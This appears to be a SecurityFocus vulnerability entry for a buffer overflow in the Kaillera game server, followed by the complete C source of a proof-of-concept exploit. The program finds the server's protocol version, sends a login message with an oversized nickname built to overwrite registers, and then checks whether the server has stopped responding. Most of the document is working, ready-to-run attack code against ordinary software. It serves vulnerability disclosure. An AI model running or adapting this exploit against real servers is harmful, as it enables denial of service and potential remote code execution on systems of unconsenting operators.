source: http://www.securityfocus.com/bid/18871/info

Kaillera is prone to a buffer-overflow vulnerability because it fails to properly bounds-check messages before copying them to an insufficiently sized memory buffer.

Successful exploits can allow remote attackers to execute arbitrary machine code in the context of the user running the application.

/********************************* winerr.h
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

/************************************ eof

********************************** kailleraex.c
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER         "0.1"
#define PORT        27888
#define BUFFSZ      0xffff
#define NICK        "nickname_aaaaaaaaaaaaaaaaaaaaaaa"  \
                    "bbbb"  /* EDI */                   \
                    "cccc"  /* EAX */



int put08(u_char *data, int num);
int put16(u_char *data, int num);
int putsc(u_char *data, u_char *src);

void delimit(u_char *data);
int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err);
int timeout(int sock, int secs);
u_int resolv(char *host);
void std_err(void);



struct  sockaddr_in peer;



int main(int argc, char *argv[]) {
    float   ver  = 0.83;
    int     sd,
            seq,
            len;
    u_short port = PORT;
    u_char  *buff,
            *p,
            *t;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "Kaillera <= 0.86 possible code execution "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

redo:
    len = sprintf(buff, "HELLO%1.2f", ver);
    len = send_recv(sd, buff, len, buff, BUFFSZ, 1);
    if(memcmp(buff, "HELLOD00D", 9)) {
        if(!strcmp(buff, "VER")) {
            ver += 0.01;
            printf("- try version %1.2f\n", ver);
            goto redo;
        }
        printf("\nError: wrong reply from the server: %s\n\n", buff);
        exit(1);
    }

    seq = 0;
    peer.sin_port = htons(atoi(buff + 9));

    printf("- connect to port %hu\n", ntohs(peer.sin_port));

    p = buff;
    p += put08(p, 1);       // number of messages

    p += put16(p, seq++);   // sequence
    t = p;      p += 2;     // size of message
    p += put08(p, 3);       // type of message
                            // message:
    p += putsc(p, NICK);
    p += putsc(p, "emulator");
    p += put08(p, 1);

    put16(t, (p - t) - 1);

    printf(
        "- send malformed message:\n"
        "  data      = 0x%08x\n"
        "  data_size = 0x%08x\n",
        *(uint32_t *)(NICK + 32),
        *(uint32_t *)(NICK + 32 + 4));
    len = send_recv(sd, buff, p - buff, buff, BUFFSZ, 0);

    sleep(ONESEC);

    printf("- check server:\n");
    len = sprintf(buff, "HELLO%1.2f", ver);
    len = send_recv(sd, buff, len, buff, BUFFSZ, 0);
    if(len < 0) {
        printf("\n  Server IS vulenrable!!!\n\n");
    } else {
        printf("\n  Server doesn't seem vulenrable\n\n");
    }
    close(sd);
    return(0);
}



int put08(u_char *data, int num) {
    data[0] = num;
    return(1);
}



int put16(u_char *data, int num) {
    data[0] = num;
    data[1] = num >> 8;
    return(2);
}



int putsc(u_char *data, u_char *src) {
    return(sprintf(data, "%s", src) + 1);
}



void delimit(u_char *data) {
    while(*data && (*data != '\n') && (*data != '\r')) data++;
    *data = 0;
}



int send_recv(int sd, u_char *in, int insz, u_char *out, int outsz, int err) {
    int     retry,
            len;

    if(in && !out) {
        if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        return(0);

    } else if(in) {
        for(retry = 3; retry; retry--) {
            if(sendto(sd, in, insz, 0, (struct sockaddr *)&peer, sizeof(peer))
              < 0) std_err();
            if(!timeout(sd, 1)) break;
        }

        if(!retry) {
            goto timeout_received;
        }

    } else {
        if(timeout(sd, 3) < 0) {
            goto timeout_received;
        }
    }

    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) std_err();
    return(len);

timeout_received:
    if(err) {
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }
    return(-1);
}



int timeout(int sock, int sec) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec  = sec;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/************************************ eof